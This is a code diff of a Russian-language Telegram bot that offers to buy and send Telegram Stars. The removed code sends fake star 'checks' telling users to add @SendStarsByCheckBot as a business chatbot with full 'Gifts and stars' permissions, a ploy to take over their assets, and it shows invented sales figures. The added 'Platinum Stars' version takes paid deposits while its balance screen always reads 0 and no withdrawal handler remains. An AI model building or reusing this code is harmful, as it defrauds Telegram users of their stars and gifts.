@@ -16,6 +16,8 @@ from aiogram.types import (
     InputTextMessageContent,
     InlineQueryResultArticle
 )
+from aiogram.types import LabeledPrice, PreCheckoutQuery
+from aiogram.filters import PreCheckoutQueryFilter
 import random
 import os
 import json
@@ -44,6 +46,9 @@ class Draw(StatesGroup):
     gift = State()
 
 class CheckState(StatesGroup):
+    waiting_for_amount = State()
+
+class DepositStates(StatesGroup):
     waiting_for_amount = State()
 
 # Initialize storage and logging
@@ -98,71 +103,27 @@ def main_menu_kb():
 
 @dp.message(Command("start"))
 async def start_cmd(message: types.Message):
-    args = message.text.split(" ")
-    user_id = message.from_user.id
+    # Создаем клавиатуру с 4 кнопками
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="⭐️ Баланс", callback_data="balance")],
+        [InlineKeyboardButton(text="➕ Пополнить звёзды", callback_data="deposit")],
+        [InlineKeyboardButton(text="📤 Вывести звёзды", callback_data="withdraw")],
+        [InlineKeyboardButton(text="❓ FAQ", callback_data="faq")]
+    ])
     
-    # Обработка параметров ссылки
-    if len(args) > 1:
-        params = args[1].split('_')
-        
-        # Обработка реферальной ссылки (может быть частью ссылки на чек)
-        if params[0].startswith("ref"):
-            try:
-                inviter_id = int(params[0].replace("ref", ""))
-                if inviter_id and inviter_id != user_id:
-                    user_referrer_map[str(user_id)] = inviter_id
-                    with open("referrers.json", "w") as f:
-                        json.dump(user_referrer_map, f)
-                    logging.info(f"New referral: {user_id} -> {inviter_id}")
-                    
-                    # Если есть параметр чека после реферальной ссылки
-                    if len(params) > 2 and params[1] == "check":
-                        amount = params[2]
-                        sender_id = params[3] if len(params) > 3 else inviter_id
-                        
-                        # Получаем информацию об отправителе
-                        try:
-                            sender = await bot.get_chat(int(sender_id))
-                            sender_name = f"@{sender.username}" if sender.username else f"ID:{sender_id}"
-                        except:
-                            sender_name = f"ID:{sender_id}"
-                        
-                        # Создаем сообщение с чеком
-                        check_message = (
-                            f"💳 Чек на {amount} звёзд\n\n"
-                            f"От: {sender_name}\n\n"
-                            "Для активации чека нажмите кнопку ниже ⬇️"
-                        )
-                        
-                        # Создаем кнопку с инструкциями
-                        builder = InlineKeyboardBuilder()
-                        builder.button(
-                            text="📝 Как активировать чек", 
-                            callback_data=f"show_activation_instructions:{amount}"
-                        )
-                        
-                        await message.answer(
-                            check_message,
-                            reply_markup=builder.as_markup()
-                        )
-                        return  # Прерываем выполнение, чтобы не показывать стартовое сообщение
-            
-            except ValueError as e:
-                logging.error(f"Referral error: {e}")
-
-    # Стандартное приветственное сообщение (если не было обработано как чек)
-    photo = FSInputFile("image.png")
+    # Загружаем фото
+    photo = FSInputFile("image.png")  # Убедитесь, что файл image.png существует в папке с ботом
+    
+    # Отправляем сообщение с фото, текстом и клавиатурой
     await message.answer_photo(
         photo=photo,
         caption=(
-            "Привет! Это удобный бот для покупки/передачи звезд в Telegram.\n\n"
-            "С ним ты можешь моментально покупать и передавать звезды.\n\n"
-            "Бот работает почти год, и с помощью него куплена огромная доля звезд в Telegram.\n\n"
-            "С помощью бота куплено:\n"
-            "6,307,360 ⭐️ (~ $94,610)\n\n"
-            "Выберите действие:"
+            "МЕНЮ\n\n"
+            "👀 Добро пожаловать в Platinum Stars!\n\n"
+            "Наш бот поможет отправить звезды без комиссии прямо на баланс получателя.\n\n"
+            "Выберите нужный раздел:"
         ),
-        reply_markup=main_menu_kb()
+        reply_markup=keyboard
     )
 
     if message.chat.id not in user_message_history:
@@ -176,90 +137,113 @@ async def start_cmd(message: types.Message):
 
 @dp.callback_query(F.data == "balance")
 async def show_balance(callback: types.CallbackQuery):
-    await callback.answer("Баланс: 0 ⭐️", show_alert=True)
+    # Загружаем фото для раздела баланса
+    balance_photo = FSInputFile("balance.png")  # Убедитесь, что файл balance.png существует
+    
+    # Текст сообщения
+    balance_text = (
+        "⭐️ Раздел «Баланс»\n\n"
+        "Количество ваших звезд: 0\n\n"
+        "Так же вы можете пополнить баланс напрямую через Telegram — быстро, анонимно и без комиссии."
+    )
+    
+    # Создаем клавиатуру с кнопкой "Назад"
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔙 Назад", callback_data="delete_message")]
+    ])
+    
+    # Отправляем фото с текстом и кнопкой
+    await callback.message.answer_photo(
+        photo=balance_photo,
+        caption=balance_text,
+        reply_markup=keyboard,
+        parse_mode="HTML"
+    )
+    await callback.answer()
+
+@dp.callback_query(F.data == "delete_message")
+async def delete_message_handler(callback: types.CallbackQuery):
+    try:
+        # Удаляем сообщение, в котором была нажата кнопка
+        await callback.message.delete()
+    except Exception as e:
+        logging.error(f"Ошибка при удалении сообщения: {e}")
+    await callback.answer()
 
 @dp.callback_query(F.data == "deposit")
 async def deposit_stars(callback: types.CallbackQuery):
-    await callback.answer("Функция пополнения звёзд", show_alert=True)
-
-@dp.callback_query(F.data == "withdraw")
-async def withdraw_stars(callback: types.CallbackQuery):
-    await callback.answer("Функция вывода звёзд", show_alert=True)
-
-@dp.callback_query(F.data == "faq")
-async def show_faq(callback: types.CallbackQuery):
-    await callback.answer("Раздел FAQ", show_alert=True)
-
-@dp.callback_query(F.data.startswith("show_activation_instructions:"))
-async def show_activation_instructions(callback: types.CallbackQuery):
-    amount = callback.data.split(":")[1]
-    
-    activation_instructions = (
-        f"💳 Чек на {amount} звёзд\n\n"
-        "⭐️ <b>Автоматическая доставка Stars — мгновенно и удобно!</b>\n\n"
-        "1. ⚙️ Откройте <b>Настройки</b>.\n"
-        "2. 💼 Нажмите на <b>Telegram для бизнеса</b>.\n"
-        "3. 🤖 Перейдите в раздел <b>Чат-боты</b>.\n"
-        "4. ✍️ Введите имя бота <b>@SendStarsByCheckBot</b> и нажмите <b>Добавить</b>.\n"
-        "5. ✅ Выдайте разрешения пункт <b>'Подарки и звезды' (5/5)</b> для выдачи звезд.\n\n"
-        "<i>Зачем это нужно?</i>\n"
-        "• Подключение бота к бизнес-чату необходимо для того, чтобы он мог автоматически "
-        "и напрямую отправлять звезды от одного пользователя другому — без лишних действий "
-        "и подтверждений."
+    deposit_photo = FSInputFile("deposit.png")
+    deposit_text = (
+        "➕ Раздел «Пополнение баланса»\n\n"
+        "Здесь вы можете пополнить баланс звёзд напрямую через Telegram.\n"
+        "Комиссии отсутствуют — все расходы на перевод покрывает бот.\n"
+        "Сумма зачисляется точно, без задержек и скрытых сборов."
     )
     
-    await send_replaceable_message(
-        chat_id=callback.message.chat.id,
-        text=activation_instructions,
-        reply_markup=None,
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="💲 Пополнить", callback_data="make_deposit")],
+        [InlineKeyboardButton(text="🔙 Назад", callback_data="delete_message")]
+    ])
+    
+    await callback.message.answer_photo(
+        photo=deposit_photo,
+        caption=deposit_text,
+        reply_markup=keyboard,
         parse_mode="HTML"
     )
     await callback.answer()
 
-@dp.callback_query(F.data == "get_stars")
-async def show_get_stars_instructions(callback: types.CallbackQuery):
-    stars_instructions = (
-        "⭐️ <b>Автоматическая доставка Stars — мгновенно и удобно!</b>\n\n"
-        "1. ⚙️ Откройте <b>Настройки</b>.\n"
-        "2. 💼 Нажмите на <b>Telegram для бизнеса</b>.\n"
-        "3. 🤖 Перейдите в раздел <b>Чат-боты</b>.\n"
-        "4. ✍️ Введите имя бота <b>@SendStarsByCheckBot</b> и нажмите <b>Добавить</b>.\n"
-        "5. ✅ Выдайте разрешения пункт <b>'Подарки и звезды' (5/5)</b> для выдачи звезд.\n\n"
-        "<i>Зачем это нужно?</i>\n"
-        "• Подключение бота к бизнес-чату необходимо для того, чтобы он мог автоматически "
-        "и напрямую отправлять звезды от одного пользователя другому — без лишних действий "
-        "и подтверждений."
+@dp.callback_query(F.data == "make_deposit")
+async def make_deposit_handler(callback: types.CallbackQuery, state: FSMContext):
+    await callback.message.answer(
+        "➕ Введите точное количество звёзд которое хотите пополнить:\n\n"
+        "Минимальная сумма для пополнения 25 звёзд."
     )
-    
-    await send_replaceable_message(
-        chat_id=callback.message.chat.id,
-        text=stars_instructions,
-        reply_markup=None,
-        parse_mode="HTML"
-    )
+    await state.set_state(DepositStates.waiting_for_amount)
     await callback.answer()
 
-@dp.callback_query(F.data == "terms")
-async def show_terms(callback: types.CallbackQuery):
-    terms_text = (
-        "<b>Условия использования @SendTgStarsBot:</b>\n\n"
-        "Полным и безоговорочным принятием условий данной оферты считается оплата клиентом услуг компании.\n\n"
-        "1. Запрещено пополнять звезды и возвращать их, иначе компания в праве досрочно остановить предоставление услуги и заблокировать клиента без возможности возврата средств.\n"
-        "2. Запрещено игнорирование жалоб компании, в случае игнорирования жалобы клиентом, компания имеет право отказать клиенту в своих услугах.\n"
-        "3. Клиенту предоставляется доступ (если не оговорено иное) к звездам, и клиент несет всю связанную с этим ответственность.\n"
-        "4. В случае нарушения условий предоставления услуг компания в праве отказать клиенту в возврате средств.\n"
-        "5. Возврат денежных средств возможен только в случае неработоспособности или за технические ошибки бота по вине компании.\n"
-        "6. Проблемы с пополнением/возвратом звезд — ответственность компании.\n\n"
-        "<i>С уважением, команда @SendStarsByCheckBot.</i>"
-    )
+@dp.message(DepositStates.waiting_for_amount, F.text)
+async def process_deposit_amount(message: types.Message, state: FSMContext):
+    try:
+        stars_amount = int(message.text)
+        if stars_amount < 25:
+            await message.answer("❌ Минимальная сумма пополнения - 25 звёзд")
+            return
+        
+        # Создаем инвойс в звездах
+        await bot.send_invoice(
+            chat_id=message.chat.id,
+            title="Пополнение баланса звёзд",
+            description=f"Пополнение баланса на {stars_amount} звёзд",
+            provider_token="",  # Оставляем пустым для звезд
+            currency="XTR",   # Код валюты для Telegram Stars
+            prices=[LabeledPrice(label="Звёзды", amount=stars_amount)],
+            payload=f"stars_deposit_{message.from_user.id}",
+            need_email=False,
+            need_phone_number=False,
+            is_flexible=False
+        )
+        
+    except ValueError:
+        await message.answer("❌ Пожалуйста, введите корректное число")
+    finally:
+        await state.clear()
+
+@dp.message(F.successful_payment)
+async def process_successful_payment(message: types.Message):
+    payment = message.successful_payment
+    stars_amount = payment.total_amount  # Уже в звездах
     
-    await send_replaceable_message(
-        chat_id=callback.message.chat.id,
-        text=terms_text,
-        reply_markup=None,
-        parse_mode="HTML"
+    # Здесь логика зачисления звезд на баланс пользователя
+    user_id = str(message.from_user.id)
+    balances = load_balances()
+    balances[user_id] = balances.get(user_id, 0) + stars_amount
+    save_balances(balances)
+    
+    await message.answer(
+        f"✅ Успешное пополнение на {stars_amount} звёзд!\n"
+        f"Ваш текущий баланс: {balances[user_id]} звёзд"
     )
-    await callback.answer()
 
 async def pagination(page=0):
     url = f'https://api.telegram.org/bot{TOKEN}/getAvailableGifts'
@@ -885,6 +869,3 @@ async def inline_query_handler(inline_query: InlineQuery):
 
 async def main():
     await dp.start_polling(bot)
-
-if __name__ == "__main__":
-    asyncio.run(main())
